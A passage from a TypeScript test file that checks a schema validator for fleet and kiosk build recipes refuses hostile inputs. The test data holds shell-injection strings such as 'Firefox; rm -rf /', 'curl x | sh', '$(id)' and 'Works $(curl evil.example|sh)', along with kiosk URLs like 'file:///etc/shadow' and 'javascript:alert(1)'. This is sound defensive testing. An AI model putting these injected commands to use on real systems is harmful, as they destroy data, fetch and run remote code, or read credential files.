    doc: mutate(S, (d) => { (d['organisation'] as Doc)['logo'] = './../logo.png'; }),
    says: /no path, no parent directory, no symlink, no URL/i,
  },
  {
    label: 'a fleet name with a dot, which is a directory nobody expected',
    doc: mutate(S, (d) => { d['name'] = '..'; }),
    says: /is not a value this field can hold|short name for this fleet|fewer than/i,
  },

  // ---- shell fragments where a name belongs ---------------------------------------------------------
  {
    label: 'a semicolon and a command in an application name',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('Firefox; rm -rf /'); }),
    says: /No digits anywhere|letters, separated by single spaces/i,
  },
  {
    label: 'a pipe into a shell in an application name',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('curl x | sh'); }),
    says: /No digits anywhere|letters, separated by single spaces/i,
  },
  {
    label: 'command substitution in an application name',
    doc: mutate(S, (d) => { (d['apps'] as string[]).push('$(id)'); }),
    says: /command substitution|No digits anywhere|letters, separated by single spaces/i,
  },
  {
    label: 'a backtick in the helpdesk phone number',
    doc: mutate(S, (d) => { ((d['organisation'] as Doc)['helpdesk'] as Doc)['phone'] = '+91 `id`'; }),
    says: /command substitution/i,
  },
  {
    label: 'a variable expansion in the approval name',
    doc: mutate(S, (d) => { (d['approved_by'] as Doc)['name'] = 'A. ${USER}'; }),
    says: /command substitution/i,
  },
  {
    label: 'command substitution in a Windows-program test note',
    doc: mutate(S, (d) => { ((d['windows_apps'] as Doc)['tested'] as Doc[])[0]!['note'] = 'Works $(curl evil.example|sh)'; }),
    says: /command substitution/i,
  },
  {
    label: 'command substitution in a kiosk allow-list host',
    doc: mutate(K, (d) => { ((d['kiosk'] as Doc)['allowed_sites'] as string[]).push('$(id).example.org'); }),
    says: /command substitution|is not a value this field can hold/i,
  },

  // ---- the kiosk address, which is the one string that reaches a command line ----------------------
  ...[
    ['javascript:alert(1)', 'a javascript: URL'],
    ['file:///etc/shadow', 'a file: URL'],
    ['data:text/html,x', 'a data: URL'],
    ['http://start.example.org/kiosk', 'plain http'],
    ['https://user:pw@start.example.org/', 'credentials in the URL'],
    ['https://start.example.org/ --kiosk-printing', 'a second browser flag appended to the address'],
    ['https://start.example.org/"; rm -rf /', 'a quote and a command'],
    ['https://start.example.org/$(id)', 'command substitution'],
    ['https://START.EXAMPLE.ORG/kiosk', 'an uppercase hostname, which is a different string to a matcher'],
    ['https://192.168.1.1/kiosk', 'a bare IP address'],
    ['ftp://start.example.org/', 'a protocol nobody meant'],
  ].map(([url, what]) => ({
    label: `a kiosk address that is ${what}`,
    doc: mutate(K, (d) => { (d['kiosk'] as Doc)['opens'] = url; }),
    says: /is not a value this field can hold|a way out of the kiosk rather than a page inside it|command substitution|not in allowed_sites/i,
  })),

  // ---- the prune list reaching something protected --------------------------------------------------
  // It cannot, and the point of these is that it cannot even be SPELT. `also_remove` is a closed enum,
  // so every one of these is refused by the shape of the field rather than by a list of exceptions.
  ...[
    ['systemd', 'the init system, by name'],
    ['bootc', 'the thing that applies an update, by name'],
    ['greenboot', 'the thing that undoes a bad update, by name'],
    ['NetworkManager', 'the thing that reaches the network, by name'],
    ['rpm', 'the package manager, by name'],
    ['boot*', 'the update path, by glob'],
    ['*', 'everything, by glob'],
    ['init system', 'the init system, by a group name that does not exist'],
    ['update path', 'the update path, by a group name that does not exist'],
    ['accessibility', 'accessibility, which is absent from the list on purpose'],
    ['screen reader', 'the screen reader, by name'],
    ['magnifier', 'the magnifier, by name'],
    ['on-screen keyboard', 'the on-screen keyboard, by name'],
    ['security', 'the security tooling, by a group name that does not exist'],
  ].map(([value, what]) => ({
    label: `pruning ${what}`,
    doc: mutate(S, (d) => { ((d['prune'] as Doc)['also_remove'] as string[]).push(value!); }),
    says: /no way to write the sentence that would brick a fleet|not one of the published choices|Accessibility is not removable|screen reader/i,
  })),

  // ---- the approval record, which is the thing a forged recipe would forge --------------------------
  {
    label: 'an approval dated in words rather than on a calendar',
    doc: mutate(S, (d) => { (d['approved_by'] as Doc)['date'] = 'yesterday'; }),
    says: /is not a value this field can hold|calendar/i,
  },
  {
    label: 'an approval dated on the ninety-ninth of the ninety-ninth',
    doc: mutate(S, (d) => { (d['approved_by'] as Doc)['date'] = '9999-99-99'; }),
    says: /is not a value this field can hold|calendar/i,
  },
  {
    label: 'an approval with no name on it',
    doc: mutate(S, (d) => { delete (d['approved_by'] as Doc)['name']; }),
    says: /and it is required/i,
  },
  {
    label: 'no approval block at all',
    doc: mutate(S, (d) => { delete d['approved_by']; }),
    says: /no 'approved_by', and it is required/i,
  },
  {
    label: 'a Windows-program result invented on the spot',
    doc: mutate(S, (d) => { ((d['windows_apps'] as Doc)['tested'] as Doc[])[0]!['result'] = 'probably fine'; }),
    says: /not one of the published choices/i,
  },
  {
    label: 'windows_apps enabled without the acknowledgement that nothing else is promised',
    doc: mutate(S, (d) => { delete (d['windows_apps'] as Doc)['we_promise_nothing_else']; }),
    says: /and it is required|promise/i,
  },

  // ---- the document itself --------------------------------------------------------------------------
  {
    label: 'a recipe that is a list rather than a block of settings',
    doc: [] as unknown as Doc,
    says: /not a list or a bare value/i,
  },
  {
    label: 'a recipe that is a bare string',
    doc: 'example-school' as unknown as Doc,
    says: /not a list or a bare value/i,
  },
  {
    label: 'a recipe that is a number',
    doc: 42 as unknown as Doc,
    says: /not a list or a bare value/i,
  },
  {
    label: 'an empty recipe',
    doc: {} as Doc,
    says: /and it is required/i,
  },
  {
    label: 'a recipe with no schema version, which is the one field that makes the rest readable later',
    doc: mutate(S, (d) => { delete d['schema']; }),
    says: /no 'schema', and it is required/i,
  },
  {
    label: 'a schema version from the future',
    doc: mutate(S, (d) => { d['schema'] = 99; }),
    says: /refuses to build rather than guessing what a field used to mean/i,
  },
  {
    label: 'a schema version of zero',
    doc: mutate(S, (d) => { d['schema'] = 0; }),
    says: /refuses to build rather than guessing what a field used to mean/i,
  },

  // ---- a kiosk that opens something nobody chose -----------------------------------------------------
  {
    label: 'a kiosk naming two applications, with nothing saying which one it opens',
    doc: mutate(K, (d) => { d['apps'] = ['Firefox', 'Google Chrome']; }),
    says: /nothing here says which one it opens|still boots, still looks right, and is wrong/i,
  },
  {
    label: 'a kiosk naming three applications',
    doc: mutate(K, (d) => { d['apps'] = ['Firefox', 'Google Chrome', 'VLC Media Player']; }),
    says: /nothing here says which one it opens/i,
  },
  {
    label: 'a kiosk whose only application cannot be opened as a window',
    doc: mutate(K, (d) => { d['apps'] = ['Calculator']; }),
    says: /names no application the machine can open|brick/i,
  },

];

test('every refusal fires, and says why refusing is the feature', async (t) => {
  for (const entry of MUST_REFUSE) {
    await t.test(entry.label, () => {
      const result = check(entry.doc);
      assert.equal(result.ok, false, `ACCEPTED but must be refused: ${entry.label}`);
      const text = said(result);
      assert.match(
        text,
        entry.says,
        `refused, but not with a sentence that teaches the rule.\n` +
          `  wanted to see: ${entry.says}\n` +
          `  actually said:\n${text.split('\n').map((l) => `    ${l}`).join('\n')}`,
      );
    });
  }
});

test('the table is large enough to be worth having', () => {
  // Not a real assertion about correctness -- a guard against the table being quietly emptied. If
  // this ever fails because somebody consolidated cases, raise the floor deliberately or lower it
  // in a commit that says why.
  assert.ok(MUST_REFUSE.length >= 200, `only ${MUST_REFUSE.length} refusal cases`);
});

test('a refusal never leaks raw validator noise where a sentence was available', () => {
  const result = check(mutate(S, (d) => { d['from'] = 'ghcr.io/x/y'; }));
  assert.equal(result.ok, false);
  assert.doesNotMatch(said(result), /must NOT be valid|should NOT be valid/i);
});

test('no refusal in the whole table prints a regular expression at a person', () => {
  // The most common refusal this toolchain produces is a pattern failure -- every version pin, every
  // homoglyph, every path traversal in a name arrives there -- and ajv's message for one IS the
  // pattern: `must match pattern "^[A-Za-z][A-Za-z+#]*(?: [A-Za-z][A-Za-z+#]*)*$"`. That was being
  // printed verbatim to a school IT coordinator in about ninety of the cases below.
  //
  // It is not a correctness bug and it is worth a test anyway: README.md promises that every refusal
  // says WHY refusing is the feature, and a reader who cannot read the refusal works around it. Every
  // one of these fields already explains its shape in words; the sentence is right there.
  const offenders: string[] = [];
  for (const entry of MUST_REFUSE) {
    const text = said(check(entry.doc));
    for (const noise of [
      /must match pattern/i,
      /\^\[A-Za-z/,                     // a character class from a real pattern in this schema
      /\(\?:/,                          // a non-capturing group: nothing a person writes
      /\\u[0-9a-f]{4}/i,                 // an escaped code point
      /#\/\$defs/,                      // a schema pointer
      /instancePath|schemaPath|additionalProperty\b/,
      /\[object Object\]|\bundefined\b/,
    ]) {
      if (noise.test(text)) {
        offenders.push(`${entry.label}\n      ${text.split('\n').find((l) => noise.test(l))?.slice(0, 140)}`);
        break;
      }
    }
  }
  assert.deepEqual(
    offenders.slice(0, 8),
    [],
    `${offenders.length} refusals print machinery instead of a sentence:\n\n${offenders.slice(0, 8).join('\n')}`,
  );
});

test('the refusal for a shape still tells the reader what the shape IS, rather than merely dropping the regex', () => {
  // The other direction, and the one that makes the test above worth having. Deleting the pattern
  // from the message would satisfy it and leave a reader with less than they started with.
  const pinned = check(mutate(S, (d) => { (d['apps'] as string[]).push('firefox-140.0'); }));
  const text = said(pinned);
  assert.match(text, /'firefox-140\.0' is not a value this field can hold/);
  assert.match(text, /the shape of what you can write, not a list of things we decided to block/);
  assert.match(text, /No digits anywhere/, 'the rule itself is not explained in words anywhere in the refusal');
});

test('a refusal never echoes a ten-megabyte value back at whoever is reading the log', () => {
  // A recipe is a pull request from a stranger, and one of the things a stranger can send is a very
  // long string. A refusal that quoted it whole would be a denial of service against the reviewer.
  const huge = check(mutate(S, (d) => { d['name'] = 'a'.repeat(5 * 1024 * 1024); }));
  assert.equal(huge.ok, false);
  const text = said(huge);
  assert.ok(text.length < 4000, `the refusal for a 5 MB value is itself ${text.length} characters long`);
  assert.match(text, /characters\)|more than \d+ characters/, 'the refusal does not say how long the value was');
});
